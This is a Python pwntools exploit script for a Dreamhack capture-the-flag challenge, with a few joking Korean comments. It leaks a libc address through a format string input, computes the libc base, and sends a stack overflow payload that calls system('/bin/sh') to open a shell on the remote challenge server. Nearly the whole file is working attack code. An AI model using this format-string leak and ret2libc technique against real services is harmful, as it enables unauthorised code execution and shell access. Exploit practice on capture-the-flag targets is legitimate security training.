#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./chal')
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 14005".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# 필자는 환경 설정을 따로 하지 않음,
# 아주낮은확률로혹시나사용할경우알아서맞춰사용하게.
# 친절한사내.그것이나다.
if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so')
else:
    p = remote('localhost', '8000')#process(env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF('./libc.so')

ru(b'your name > ')
sl(b'%p %p %p')
ru(b'Hi! ')
leak = int(rl().split()[-1], 16)
slog("leak", leak)

lb = leak - 0x46f4c
slog('libc_base', lb)
libc.address = lb

system = libc.sym["system"]
binsh = next(libc.search(b'/bin/sh\x00'))

slog("system", system)
slog("/bin/sh", binsh)

gs = [0x3cae8, 0x349d8, 0x3c104, 0x3ba90, 0x3bac0]
gadget = lb + gs[4]
slog('gadget', gadget)

pay = b'A'*0x100 + b'B'*0x8 + p64(gadget)
pay += p64(system)
pay += p64(0) * 2
pay += p64(binsh)

sla(b'> ', pay)

p.interactive()
